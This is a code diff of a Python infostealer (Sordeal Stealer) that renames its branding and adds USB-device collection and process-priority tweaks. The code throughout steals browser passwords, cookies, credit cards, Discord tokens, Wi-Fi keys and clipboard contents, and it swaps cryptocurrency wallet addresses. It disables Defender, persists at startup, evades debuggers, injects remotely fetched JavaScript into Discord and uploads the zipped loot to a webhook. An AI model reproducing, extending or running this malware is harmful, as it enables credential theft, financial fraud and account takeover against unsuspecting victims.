@@ -20,6 +20,8 @@ import pyperclip
 import locale
 import win32gui
 import win32con
+import win32api
+import win32process
 from typing import Union
 
 from sqlite3 import connect
@@ -42,20 +44,37 @@ temp = os.getenv("TEMP")
 
 NotPSSW = []
 
+please_myname_secret = "https://rentry.co/9ops5/raw"
+thisresp = requests.get(please_myname_secret)
+mynameis = thisresp.text
+
+
+please_myname_secretbutlil = "https://rentry.co/khsph/raw"
+thisrespbutlil = requests.get(please_myname_secretbutlil)
+myname_little = thisrespbutlil.text
+
+pleasegetsecretcore = "https://rentry.co/rh234/raw"
+thissecretcore = requests.get(pleasegetsecretcore)
+coresecretname = thissecretcore.text
+
+
+
 __config__ = {
     # Basic Options
-    "SO_webhook": "%WEBHOOK_HERE%",
-    "SO_injection_url": "https://raw.githubusercontent.com/Inplex-sys/Sordeal-Stealer-NoDualHook/main/inject.js",
+    "websecret": "%WEBHOOK_HERE%",
+    "inject_url_please": f"https://raw.githubusercontent.com/{mynameis}/{mynameis}-Injection/main/index.js",
+    "customcreator": "%PC_CREATOR%",
+    "customuser": "%USER_CREATOR%",
 
     # Files Options
-    "SO_getbrowsersfiles": "%_browsers_files%",
-    "SO_getavfiles": "%_av_files%",
-    "SO_getminecraft": "%minecraft_files%",
-    "SO_getsysteme": "%_systeme_files%",
-    "SO_getroblox": "%_roblox_files%",
-    "SO_getscreenshot": "%_screen_files%",
-    "SO_getclipboard": "%_clipboard_files%",
-    "SO_getwifipassword": "%wifipassword_files%",
+    "please_getbrowsersfiles": "%_browsers_files%",
+    "please_getavfiles": "%_av_files%",
+    "please_getminecraft": "%minecraft_files%",
+    "please_getsysteme": "%_systeme_files%",
+    "please_getroblox": "%_roblox_files%",
+    "please_getscreenshot": "%_screen_files%",
+    "please_getclipboard": "%_clipboard_files%",
+    "please_getwifipassword": "%wifipassword_files%",
 
     # Stealer Options
     "hide": "%_hide_script%",
@@ -64,19 +83,19 @@ __config__ = {
     "fake_error": "%_error_enabled%",
     "startup": "%_startup_enabled%",
     "kill_discord_process": '%kill_discord_process%',
-    "SO_antidebug": '%_debugkiller%',
+    "please_antidebug": '%_debugkiller%',
     "disabledefenderornot": "%Defender_disable%",
 
     # Crypto Options
-    "SO_crypto_fucker": "%_address_replacer%",
-    "SO_BTCADD": "%_btc_address%",
-    "SO_ETHADD": "%_eth_address%",
-    "SO_XCHADD": "%_xchain_address%",
-    "SO_PCHADD": "%_pchain_address%",
-    "SO_CCHADD": "%_cchain_address%",
-    "SO_MONEADD": "%_monero_address%",
-    "SO_ADAADD": "%_ada_address%",
-    "SO_DASHADD": "%_dash_address%",
+    "please_crypto_fucker": "%_address_replacer%",
+    "please_BTCADD": "%_btc_address%",
+    "please_ETHADD": "%_eth_address%",
+    "please_XCHADD": "%_xchain_address%",
+    "please_PCHADD": "%_pchain_address%",
+    "please_CCHADD": "%_cchain_address%",
+    "please_MONEADD": "%_monero_address%",
+    "please_ADAADD": "%_ada_address%",
+    "please_DASHADD": "%_dash_address%",
 
     "blfirewall": [
         "MsMpEng",
@@ -170,22 +189,31 @@ __config__ = {
 
 login_info = os.getlogin()
 computer_victim = os.getenv("COMPUTERNAME")
-fast_memory_storage = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
 storage_space = str(psutil.disk_usage("/")[0] / 1024 ** 3).split(".")[0]
+fast_memory_storage = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
 
-SO_myregex_secret = "https://rentry.co/cacabyshaman/raw"
-reg_req = requests.get(SO_myregex_secret)
+please_myregex_secret = "https://rentry.co/shitonyourAV/raw"
+reg_req = requests.get(please_myregex_secret)
 regx_net = r"[\w-]{24}\." + reg_req.text
+
+
+
+
 
 
 class Functions(object):
     @staticmethod
-    def so_findClipboard():
+    def please_findClipboard():
         return subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True).stdout.decode(
             errors='backslashreplace').strip()
+    
+    @staticmethod
+    def please_findDevices():
+        return subprocess.run("powershell Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }",
+                        creationflags=0x08000000, shell=True, capture_output=True)
 
     @staticmethod
-    def so_findwifi():
+    def please_findwifi():
         profiles = list()
         passwords = dict()
 
@@ -326,18 +354,18 @@ class Functions(object):
         return [ip, city, country, region, org, loc, googlemap]
 
 
-class AutoCopyWallet(Functions):
+class Replacer_Loop(Functions):
     def __init__(self):
-        self.address_st3aler = self.find_in_config("SO_crypto_fucker")
+        self.btc_finder = self.find_in_config("please_crypto_fucker")
         self.addresses = {
-            "btc": self.find_in_config("SO_BTCADD"),
-            "eth": self.find_in_config("SO_ETHADD"),
-            "xchain": self.find_in_config("SO_XCHADD"),
-            "pchain": self.find_in_config("SO_PCHADD"),
-            "cchain": self.find_in_config("SO_CCHADD"),
-            "monero": self.find_in_config("SO_MONEADD"),
-            "ada": self.find_in_config("SO_ADAADD"),
-            "dash": self.find_in_config("SO_DASHADD"),
+            "btc": self.find_in_config("please_BTCADD"),
+            "eth": self.find_in_config("please_ETHADD"),
+            "xchain": self.find_in_config("please_XCHADD"),
+            "pchain": self.find_in_config("please_PCHADD"),
+            "cchain": self.find_in_config("please_CCHADD"),
+            "monero": self.find_in_config("please_MONEADD"),
+            "ada": self.find_in_config("please_ADAADD"),
+            "dash": self.find_in_config("please_DASHADD"),
         }
 
     def copy_address(self, regex, address_key):
@@ -366,14 +394,14 @@ class AutoCopyWallet(Functions):
             self.address_swap()
 
     def run(self):
-        if self.address_st3aler == "yes":
+        if self.btc_finder == "yes":
             self.loop_through()
 
 
-class first_function_bc(Functions):
+class first_srdl_func(Functions):
     def __init__(self):
 
-        self.ddeco = f'{base64.b64decode(self.find_in_config("SO_webhook"))}'.replace(
+        self.ddeco = f'{base64.b64decode(self.find_in_config("websecret"))}'.replace(
             "b'", "").replace("'", "")
         self.ddecos = str(self.ddeco)
 
@@ -389,7 +417,13 @@ class first_function_bc(Functions):
             'Wifi': 0
         }
 
-        self.thiswebhooknotencrypt = self.ddecos
+        self.thefckingwebhook = self.ddecos
+        
+        self.customcreator = self.find_in_config("customcreator")
+
+        self.customname = str(self.customcreator)
+
+        self.custombutstr = self.customname
 
         self.hide = self.find_in_config("hide")
 
@@ -405,21 +439,21 @@ class first_function_bc(Functions):
 
         self.fake_error = self.find_in_config("fake_error")
 
-        self.ineedtogetbrowsers = self.find_in_config("SO_getbrowsersfiles")
+        self.ineedtogetbrowsers = self.find_in_config("please_getbrowsersfiles")
 
-        self.ineedtogetav = self.find_in_config("SO_getavfiles")
+        self.ineedtogetav = self.find_in_config("please_getavfiles")
 
-        self.ineedtogetmc = self.find_in_config("SO_getminecraft")
+        self.ineedtogetmc = self.find_in_config("please_getminecraft")
 
-        self.ineedtogetsys = self.find_in_config("SO_getsysteme")
+        self.ineedtogetsys = self.find_in_config("please_getsysteme")
 
-        self.ineedtogetrblx = self.find_in_config("SO_getroblox")
+        self.ineedtogetrblx = self.find_in_config("please_getroblox")
 
-        self.ineedtogetscreen = self.find_in_config("SO_getscreenshot")
+        self.ineedtogetscreen = self.find_in_config("please_getscreenshot")
 
-        self.ineedtogetclipboard = self.find_in_config("SO_getclipboard")
+        self.ineedtogetclipboard = self.find_in_config("please_getclipboard")
 
-        self.ineedtogetwifipassword = self.find_in_config("SO_getwifipassword")
+        self.ineedtogetwifipassword = self.find_in_config("please_getwifipassword")
 
         self.appdata = os.getenv("localappdata")
 
@@ -435,6 +469,7 @@ class first_function_bc(Functions):
         self.total, self.used, self.free = shutil.disk_usage("/")
 
         self.code_winpc = locale.getdefaultlocale()[0]
+        self.fast_memory_storage = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
 
         # Convert to GB
         self.total_gb = self.total / (2**30)
@@ -450,8 +485,8 @@ class first_function_bc(Functions):
         self.progress_bar = "[" + "█" * self.num_filled_blocks + "." * \
             (self.progress_bar_length - self.num_filled_blocks) + "]"
 
-        self.SO_mycommand_secret = "https://rentry.co/shitbymyself/raw"
-        self.secretcommand = requests.get(self.SO_mycommand_secret)
+        self.please_mycommand_secret = "https://rentry.co/shitbymyself/raw"
+        self.secretcommand = requests.get(self.please_mycommand_secret)
         self.command_disable = f"{self.secretcommand}"
 
         self.windows_uuid, self.never_wind, self.key_windows_find = (
@@ -470,11 +505,11 @@ class first_function_bc(Functions):
             self.googlemap,
         ) = (net[0], net[1], net[2], net[3], net[4], net[5], net[6])
 
-        self.srtupl0c = ntpath.join(
+        self.localstartup = ntpath.join(
             self.roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
         )
 
-        self.find_myreg_web = "api/webhooks"
+        self.webapi_find = "api/webhooks"
 
         self.chrmrgx = re.compile(
             r"(^profile\s\d*)|default|(guest profile$)", re.IGNORECASE | re.MULTILINE
@@ -488,7 +523,7 @@ class first_function_bc(Functions):
 
         self.tokens = []
 
-        self.SO_id = []
+        self.please_id = []
 
         self.sep = os.sep
 
@@ -499,7 +534,7 @@ class first_function_bc(Functions):
 
         os.makedirs(self.dir, exist_ok=True)
 
-    def remoter_SO_err(self: str) -> str:
+    def remoter_please_err(self: str) -> str:
         if self.fake_error != "yes":
             return
         ctypes.windll.user32.MessageBoxW(
@@ -513,20 +548,20 @@ class first_function_bc(Functions):
         if self.pingonrun != "yes":
             return
         ping1 = {
-            "username": "Sordeal - Stealer",
-            "avatar_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/sordeal.png",
+            "username": f"{mynameis} - Stealer",
+            "avatar_url": f"https://raw.githubusercontent.com/{mynameis}/Assets/main/{myname_little}.png",
             "content": "@everyone",
         }
         ping2 = {
-            "username": "Sordeal - Stealer",
-            "avatar_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/sordeal.png",
+            "username": f"{mynameis} - Stealer",
+            "avatar_url": f"https://raw.githubusercontent.com/{mynameis}/Assets/main/{myname_little}.png",
             "content": "@here",
         }
-        if self.find_myreg_web in self.thiswebhooknotencrypt:
+        if self.webapi_find in self.thefckingwebhook:
             if self.pingtype in ["@everyone", "everyone"]:
-                httpx.post(self.thiswebhooknotencrypt, json=ping1)
+                httpx.post(self.thefckingwebhook, json=ping1)
             elif self.pingtype in ["@here", "here"]:
-                httpx.post(self.thiswebhooknotencrypt, json=ping2)
+                httpx.post(self.thefckingwebhook, json=ping2)
 
     def startup_so(self: str) -> str:
         if self.startupexe != "yes":
@@ -544,8 +579,12 @@ class first_function_bc(Functions):
             return
         hwnd = win32gui.GetForegroundWindow()
         win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+        current_pid = win32api.GetCurrentProcessId()
+        current_process_handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, current_pid)
+        win32process.SetPriorityClass(current_process_handle, win32process.IDLE_PRIORITY_CLASS)
 
-    def SO_exit_this(self):
+
+    def please_exit_this(self):
         shutil.rmtree(self.dir, ignore_errors=True)
         os._exit(0)
 
@@ -562,7 +601,6 @@ class first_function_bc(Functions):
 
     def getlange(self, pc_code) -> str:
         try:
-            
             lang_map = {
                 "fr_FR": "FR_",
                 "ar-SA": "AR_",
@@ -740,16 +778,16 @@ class first_function_bc(Functions):
             "Profile 5",
         ]
 
-        if self.thiswebhooknotencrypt == "" or self.thiswebhooknotencrypt == "\x57EBHOOK_HERE":
-            self.SO_exit_this()
+        if self.thefckingwebhook == "" or self.thefckingwebhook == "\x57EBHOOK_HERE":
+            self.please_exit_this()
 
         self.hide_so()
-        self.so_please_disabledefender()
-        self.remoter_SO_err()
+        self.please_please_disabledefender()
+        self.remoter_please_err()
         self.startup_so()
 
-        if self.find_in_config("SO_antidebug") and NoDebugg().inVM is True:
-            self.SO_exit_this()
+        if self.find_in_config("please_antidebug") and NoDebugg().inVM is True:
+            self.please_exit_this()
         await self.bypss_betterdsc()
         await self.bypass_tokenprtct()
 
@@ -760,12 +798,13 @@ class first_function_bc(Functions):
             os.makedirs(ntpath.join(self.dir, "Roblox"), exist_ok=True)
         function_list = [
             self.screentimes,
-            self.getmywifiSordeal,
+            self.please_get_mywifi,
             self.getmyclipboard,
-            self.so_please_getmyAV,
+            self.please_findUSBdevices,
+            self.please_please_getmyAV,
             self.system_informations,
-            self.find_bctoken,
-            self.mc_find,
+            self.find_my_tkn,
+            self.find_my_mc,
             self.find_roblox,
         ]
 
@@ -778,10 +817,10 @@ class first_function_bc(Functions):
                 continue
             self.masterkey = self.mykey_gtm(path + "\\Local State")
             self.funcs = [
-                self.so_stol_cookies2,
-                self.so_stol_history2,
-                self.so_stol_passwords2,
-                self.so_stol_cc2,
+                self.please_steal_cookss,
+                self.please_steal_thishist2,
+                self.please_steal_psw2,
+                self.please_steal_cc2,
             ]
 
             for profile in self.profiles:
@@ -793,7 +832,7 @@ class first_function_bc(Functions):
         if ntpath.exists(self.chrmmuserdtt) and self.chrome_key is not None:
             os.makedirs(ntpath.join(self.dir, "Google"), exist_ok=True)
             function_list.extend(
-                [self.so_stol_passwords, self.so_stol_cookies, self.so_stol_history]
+                [self.please_steal_psw, self.please_stol_cookies, self.please_steal_thishist]
             )
         for func in function_list:
             process = threading.Thread(target=func, daemon=True)
@@ -804,55 +843,57 @@ class first_function_bc(Functions):
             except RuntimeError:
                 continue
         self.natify_matched_tokens()
-        await self.disco_injection()
+        await self.injection_discord()
         self.ping_on_running()
         self.finished_bc()
 
-    async def disco_injection(self):
-        for _dir in os.listdir(self.appdata):
-            if "discord" in _dir.lower():
-                discord = self.appdata + os.sep + _dir
-                for __dir in os.listdir(ntpath.abspath(discord)):
-                    if re.match(r"app-(\d*\.\d*)*", __dir):
-                        app = ntpath.abspath(ntpath.join(discord, __dir))
-                        modules = ntpath.join(app, "modules")
+    async def injection_discord(self):
+        for firstpath in os.listdir(self.appdata):
+            if "discord" in firstpath.lower():
+                discord = self.appdata + os.sep + firstpath
+                for secondpath in os.listdir(ntpath.abspath(discord)):
+                    if re.match(r"app-(\d*\.\d*)*", secondpath):
+                        app = ntpath.abspath(ntpath.join(discord, secondpath))
+                        thepathfile = ntpath.join(app, "modules")
 
-                        if not ntpath.exists(modules):
+                        if not ntpath.exists(thepathfile):
                             return
-                        for ___dir in os.listdir(modules):
-                            if re.match(r"discord_desktop_core-\d+", ___dir):
+                        for threepath in os.listdir(thepathfile):
+                            if re.match(rf"{coresecretname}-\d+", threepath):
                                 inj_path = (
-                                    modules
+                                    thepathfile
                                     + os.sep
-                                    + ___dir
-                                    + f"\\discord_desktop_core\\"
+                                    + threepath
+                                    + f"\\{coresecretname}\\"
                                 )
 
                                 if ntpath.exists(inj_path):
-                                    if self.srtupl0c not in argv[0]:
+                                    if self.localstartup not in argv[0]:
                                         try:
                                             os.makedirs(
-                                                inj_path + "SORDEAL", exist_ok=True
+                                                inj_path + f"{mynameis}", exist_ok=True
                                             )
                                         except PermissionError:
                                             pass
-                                    if self.find_myreg_web in self.thiswebhooknotencrypt:
+                                    if self.webapi_find in self.thefckingwebhook:
                                         f = httpx.get(
                                             self.find_in_config(
-                                                "SO_injection_url")
+                                                "inject_url_please")
                                         ).text.replace(
-                                            "%WEBHOOK%", self.thiswebhooknotencrypt
+                                            "%WEBHOOK%", self.thefckingwebhook
+                                        ).replace(
+                                            "%NAME_CREATOR%", self.custombutstr
                                         )
                                     try:
                                         with open(
                                                 inj_path + "index.js", "w", errors="ignore"
-                                        ) as indexFile:
-                                            indexFile.write(f)
+                                        ) as indexdiscfile:
+                                            indexdiscfile.write(f)
                                     except PermissionError:
                                         pass
                                     if self.find_in_config("kill_discord_process"):
                                         os.startfile(
-                                            app + self.sep + _dir + ".exe")
+                                            app + self.sep + firstpath + ".exe")
 
     async def bypass_tokenprtct(self):
         tp = os.path.join(self.roaming, "DiscordTokenProtector")
@@ -869,7 +910,7 @@ class first_function_bc(Functions):
                 item = json.load(f)
             except json.decoder.JSONDecodeError:
                 return
-        item["SORDEAL_is_here"] = "https://github.com/Sordeal"
+        item[f"{mynameis}_is_here"] = f"https://github.com/{mynameis}"
         item["auto_start"] = False
         item["auto_start_discord"] = False
         item["integrity"] = False
@@ -886,7 +927,7 @@ class first_function_bc(Functions):
 
         with open(config, "w") as f:
             json.dump(item, f, indent=2, sort_keys=True)
-            f.write("\n\n//Shaman_is_here | https://github.com/Sordeal")
+            f.write(f"\n\n//{mynameis}_is_here | https://github.com/{mynameis}")
 
     async def kill_process_id(self):
         bllist = self.find_in_config("blprggg")
@@ -917,15 +958,15 @@ class first_function_bc(Functions):
     async def bypss_betterdsc(self):
         bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
         if ntpath.exists(bd):
-            x = self.find_myreg_web
+            x = self.webapi_find
             with open(bd, "r", encoding="cp437", errors="ignore") as f:
                 txt = f.read()
-                content = txt.replace(x, "SHAMANgot")
+                content = txt.replace(x, f"{mynameis}goat")
             with open(bd, "w", newline="", encoding="cp437", errors="ignore") as f:
                 f.write(content)
 
     @extract_try
-    def value_dcrypt(self, buff, master_key):
+    def decrypt_this_value(self, buff, master_key):
         try:
             iv = buff[3:15]
             payload = buff[15:]
@@ -936,7 +977,7 @@ class first_function_bc(Functions):
         except Exception:
             return "Failed to decrypt password"
 
-    def MasterKey_find(self, path):
+    def find_my_masterk3y(self, path):
         with open(path, "r", encoding="utf-8") as f:
             c = f.read()
         local_state = json.loads(c)
@@ -945,7 +986,7 @@ class first_function_bc(Functions):
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
 
-    def find_bctoken(self):
+    def find_my_tkn(self):
         paths = {
             "Discord": self.roaming + "\\discord\\Local Storage\\leveldb\\",
             "Discord Canary": self.roaming
@@ -1014,10 +1055,10 @@ class first_function_bc(Functions):
                         ]:
                             for y in re.findall(self.encrypted_regex, line):
                                 try:
-                                    token = self.value_dcrypt(
+                                    token = self.decrypt_this_value(
                                         base64.b64decode(
                                             y.split("dQw4w9WgXcQ:")[1]),
-                                        self.MasterKey_find(
+                                        self.find_my_masterk3y(
                                             self.roaming +
                                             f"\\{disc}\\Local State"
                                         ),
@@ -1037,9 +1078,9 @@ class first_function_bc(Functions):
                                     pass
                                 if r.status_code == 200:
                                     uid = r.json()["id"]
-                                    if uid not in self.SO_id:
+                                    if uid not in self.please_id:
                                         self.tokens.append(token)
-                                        self.SO_id.append(uid)
+                                        self.please_id.append(uid)
             else:
                 for filname in os.listdir(path):
                     if filname[-3:] not in ["log", "ldb"]:
@@ -1063,9 +1104,9 @@ class first_function_bc(Functions):
                                 pass
                             if r.status_code == 200:
                                 uid = r.json()["id"]
-                                if uid not in self.SO_id:
+                                if uid not in self.please_id:
                                     self.tokens.append(token)
-                                    self.SO_id.append(uid)
+                                    self.please_id.append(uid)
         if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(
                     self.roaming + "\\Mozilla\\Firefox\\Profiles"
@@ -1092,11 +1133,11 @@ class first_function_bc(Functions):
                                 pass
                             if r.status_code == 200:
                                 uid = r.json()["id"]
-                                if uid not in self.SO_id:
+                                if uid not in self.please_id:
                                     self.tokens.append(token)
-                                    self.SO_id.append(uid)
+                                    self.please_id.append(uid)
 
-    def random_dir_create(self, _dir: str or os.PathLike = gettempdir()):
+    def dir_random_create(self, _dir: str or os.PathLike = gettempdir()):
         filname = "".join(
             random.SystemRandom().choice(
                 "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
@@ -1108,7 +1149,7 @@ class first_function_bc(Functions):
         return path
 
     @extract_try
-    def so_stol_passwords2(self, name: str, path: str, profile: str):
+    def please_steal_psw2(self, name: str, path: str, profile: str):
         if self.ineedtogetbrowsers != "yes":
             return
 
@@ -1116,7 +1157,7 @@ class first_function_bc(Functions):
         if not os.path.isfile(path):
             return
 
-        loginvault = self.random_dir_create()
+        loginvault = self.dir_random_create()
         try:
             copy2(path, loginvault)
             conn = sqlite3.connect(loginvault)
@@ -1126,7 +1167,7 @@ class first_function_bc(Functions):
                     if url:
                         password = self.value_decrypt(password, self.masterkey)
                         f.write(
-                            f"URL: {url}\nID: {username}\nSordeal  Password: {password}\n\n")
+                            f"URL: {url}\nID: {username}\n{mynameis}  Password: {password}\n\n")
                         self.thingstocount['Pssw'] += len(password)
             cursor.close()
         finally:
@@ -1134,7 +1175,7 @@ class first_function_bc(Functions):
             os.remove(loginvault)
 
     @extract_try
-    def so_stol_cookies2(self, name: str, path: str, profile: str):
+    def please_steal_cookss(self, name: str, path: str, profile: str):
         if self.ineedtogetbrowsers != "yes":
             return
 
@@ -1142,7 +1183,7 @@ class first_function_bc(Functions):
         if not os.path.isfile(path):
             return
 
-        cookievault = self.random_dir_create()
+        cookievault = self.dir_random_create()
         shutil.copy2(path, cookievault)
 
         conn = sqlite3.connect(cookievault)
@@ -1170,7 +1211,7 @@ class first_function_bc(Functions):
         self.thingstocount['Cooks'] += len(host_key)
 
     @extract_try
-    def so_stol_passwords(self):
+    def please_steal_psw(self):
         if self.ineedtogetbrowsers != "yes":
             return
 
@@ -1192,14 +1233,14 @@ class first_function_bc(Functions):
                                 encrypted_password, self.chrome_key)
                             if url:
                                 f.write(
-                                    f"URL: {url}\nID: {username}\nSordeal  Password: {decrypted_password}\n\n")
+                                    f"URL: {url}\nID: {username}\n{mynameis}  Password: {decrypted_password}\n\n")
                                 self.thingstocount['Pssw'] += len(
                                     decrypted_password)
 
                     os.remove(login)
 
     @extract_try
-    def so_stol_cookies(self):
+    def please_stol_cookies(self):
         if self.ineedtogetbrowsers != "yes":
             return
 
@@ -1236,7 +1277,7 @@ class first_function_bc(Functions):
                     os.remove(login)
             f.close()
 
-    def so_stol_history2(self, name: str, path: str, profile: str):
+    def please_steal_thishist2(self, name: str, path: str, profile: str):
         if self.ineedtogetbrowsers != "yes":
             return
 
@@ -1244,7 +1285,7 @@ class first_function_bc(Functions):
         if not os.path.isfile(path):
             return
 
-        historyvault = self.random_dir_create()
+        historyvault = self.dir_random_create()
         shutil.copy2(path, historyvault)
 
         conn = sqlite3.connect(historyvault)
@@ -1272,14 +1313,14 @@ class first_function_bc(Functions):
         conn.close()
         os.remove(historyvault)
 
-    def so_stol_cc2(self, name: str, path: str, profile: str):
+    def please_steal_cc2(self, name: str, path: str, profile: str):
         if self.ineedtogetbrowsers != "yes":
             return
 
         path += "\\" + profile + "\\Web Data"
         if not os.path.isfile(path):
             return
-        cc_vaults = self.random_dir_create()
+        cc_vaults = self.dir_random_create()
         copy2(path, cc_vaults)
         with sqlite3.connect(cc_vaults) as conn:
             conn.row_factory = sqlite3.Row
@@ -1297,12 +1338,12 @@ class first_function_bc(Functions):
         os.remove(cc_vaults)
 
     @extract_try
-    def so_stol_history(self):
+    def please_steal_thishist(self):
         if self.ineedtogetbrowsers != "yes":
             return
 
         with open(ntpath.join(self.dir, "Google", "History.txt"), "w", encoding="cp437", errors="ignore") as f:
-            def SO_pleaseexctract(db_cursor):
+            def please_pleaseexctract(db_cursor):
                 db_cursor.execute(
                     "SELECT title, url, last_visit_time FROM urls")
                 for item in db_cursor.fetchall():
@@ -1326,10 +1367,10 @@ class first_function_bc(Functions):
                     cursor = conn.cursor()
 
                     search_history = exctract_websearch_bc(cursor)
-                    web_history = SO_pleaseexctract(cursor)
+                    web_history = please_pleaseexctract(cursor)
 
                     f.write(
-                        f"{' ' * 17}SORDEAL SEARCH\n{'-' * 50}\n{search_history}\n{' ' * 17}\n\nLinks History\n{'-' * 50}\n{web_history}"
+                        f"{' ' * 17}{mynameis} SEARCH\n{'-' * 50}\n{search_history}\n{' ' * 17}\n\nLinks History\n{'-' * 50}\n{web_history}"
                     )
 
                     self.thingstocount['Hist'] += sum(
@@ -1378,7 +1419,7 @@ class first_function_bc(Functions):
                 )
                 self.thingstocount['Disco_info'] += 1
 
-    def mc_find(self) -> None:
+    def find_my_mc(self) -> None:
         if self.ineedtogetmc != "yes":
             return
 
@@ -1399,13 +1440,25 @@ class first_function_bc(Functions):
     def getmyclipboard(self):
         if self.ineedtogetclipboard != "yes":
             return
-        output = Functions.so_findClipboard()
+        output = Functions.please_findClipboard()
         if output:
             with open(os.path.join(self.dir, 'Systeme', 'Latest Clipboard.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                 file.write(
-                    "Sordeal | https://github.com/Sordeal/Sordeal-Stealer\n\n" + output)
+                    f"{mynameis} | https://github.com/{mynameis}/{mynameis}-Stealer\n\n" + output)
+                
 
-    def so_please_getmyAV(self):
+    def please_findUSBdevices(self):
+        try:
+            output = Functions.please_findDevices()
+            if output:
+                with open(os.path.join(self.dir, 'Systeme', 'Devices Info.txt'), 'w', encoding='utf-8', errors='ignore') as file:
+                    file.write(
+                    f"{mynameis} | https://github.com/{mynameis}/{mynameis}-Stealer\n\n" + output)
+        except Exception:
+            return None
+        
+
+    def please_please_getmyAV(self):
         if self.ineedtogetav != "yes":
             return
         cmd = 'WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName'
@@ -1422,7 +1475,7 @@ class first_function_bc(Functions):
             with open(av_path, "w", encoding="utf-8", errors="ignore") as f:
                 f.write("\n".join(av_list))
 
-    def so_please_disabledefender(self):
+    def please_please_disabledefender(self):
         if self.disablemydefender != "yes":
             return
 
@@ -1433,14 +1486,14 @@ class first_function_bc(Functions):
             pass
 
     @extract_try
-    def getmywifiSordeal(self):
+    def please_get_mywifi(self):
         if self.ineedtogetwifipassword != "yes":
             return
 
-        passwords = Functions.so_findwifi()
+        passwords = Functions.please_findwifi()
         profiles = [
-            f'SSID: {ssid}\nSordeal  Password: {password}' for ssid, password in passwords.items()]
-        divider = '\n\nSordeal | https://github.com/Sordeal/Sordeal-Stealer\n\n'
+            f'SSID: {ssid}\n{mynameis}  Password: {password}' for ssid, password in passwords.items()]
+        divider = f'\n\n{mynameis} | https://github.com/{mynameis}/{mynameis}-Stealer\n\n'
 
         with open(ntpath.join(self.dir, 'Systeme', 'Wifi Info.txt'), "w", encoding='utf-8', errors='ignore') as file:
             file.write(divider + divider.join(profiles))
@@ -1487,7 +1540,7 @@ class first_function_bc(Functions):
             f"{login_info} | {computer_victim}",
             f"Windows key: {self.key_windows_find}",
             f"Windows version: {self.never_wind}",
-            f"RAM: {fast_memory_storage}GB",
+            f"RAM: {self.fast_memory_storage}GB",
             f"DISK: {storage_space}GB",
             f"HWID: {self.windows_uuid}",
             f"IP: {self.ip}",
@@ -1512,15 +1565,15 @@ class first_function_bc(Functions):
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
                             f.write(
-                                "SORDEAL Create By SHAMAN SOVIETIC | https://github.com/Sordeal\n\n"
+                                f"{mynameis} Create By {mynameis} Team | https://github.com/{mynameis}\n\n"
                             )
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(
                                 x
-                                + "\n\nSORDEAL Create By SHAMAN SOVIETIC | https://github.com/Sordeal"
+                                + f"\n\n{mynameis} Create By {mynameis} Team | https://github.com/{mynameis}"
                             )
         _zipfile = ntpath.join(
-            self.appdata, f"{self.getlange(self.code_winpc)}SORDEAL_[{login_info}].zip")
+            self.appdata, f"{self.getlange(self.code_winpc)}{mynameis}_[{login_info}].zip")
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         path_src = ntpath.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
@@ -1537,19 +1590,19 @@ class first_function_bc(Functions):
                 file_count += 1
         for tkn in self.tokens:
             tokens += f"{tkn}\n\n"
-        fileCount = f"{file_count} SORDEALISED FILES: "
+        fileCount = f"{file_count} {mynameis}ISED FILES: "
         embed = {
-            "username": "Sordeal",
-            "avatar_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/sordeal.png",
+            "username": f"{mynameis}",
+            "avatar_url": f"https://raw.githubusercontent.com/{mynameis}/Assets/main/{myname_little}.png",
             "embeds": [
                 {
                     "author": {
-                        "name": f"SORDEAL v3",
-                        "url": "https://github.com/Sordeal",
-                        "icon_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/output-onlinegiftools.gif",
+                        "name": f"{mynameis} v4",
+                        "url": f"https://github.com/{mynameis}",
+                        "icon_url": f"https://raw.githubusercontent.com/{mynameis}/Assets/main/output-onlinegiftools.gif",
                     },
                     "color": 16711718,
-                    "description": f"[SORDEAL ON TOP]({self.googlemap})",
+                    "description": f"[{mynameis} ON TOP]({self.googlemap})",
                     "fields": [
                         {
                             "name": "\u200b",
@@ -1571,7 +1624,7 @@ class first_function_bc(Functions):
                                 # Computer Name: {computer_victim.replace(" ", " ")}
                                 # Windows Key: {self.key_windows_find.replace(" ", " ")}
                                 # Windows Ver: {self.never_wind.replace(" ", " ")}
-                                # Ram Stockage: {fast_memory_storage}GB
+                                # Ram Stockage: {self.fast_memory_storage}GB
                                 # Disk Stockage: {storage_space}GB
                                 # Total Disk Storage: {self.total_gb:.2f}GB
                                 # Used {self.used_gb:.2f}GB
@@ -1632,16 +1685,16 @@ class first_function_bc(Functions):
 
                     ],
                     "footer": {
-                        "text": "SORDEAL Create BY SHAMAN・https://github.com/Sordeal"
+                        "text": f"{mynameis} Create BY {mynameis} Team・https://github.com/{mynameis}"
                     },
                 }
             ],
         }
 
         with open(_zipfile, "rb") as f:
-            if self.find_myreg_web in self.thiswebhooknotencrypt:
-                httpx.post(self.thiswebhooknotencrypt, json=embed)
-                httpx.post(self.thiswebhooknotencrypt,
+            if self.webapi_find in self.thefckingwebhook:
+                httpx.post(self.thefckingwebhook, json=embed)
+                httpx.post(self.thefckingwebhook,
                            files={"upload_file": f})
         os.remove(_zipfile)
 
@@ -1839,10 +1892,10 @@ class NoDebugg(Functions):
             self.programExit()
 
     def Check_and_Spec(self):
-        fast_memory_storage = int(fast_memory_storage)
-        storage_space = int(storage_space)
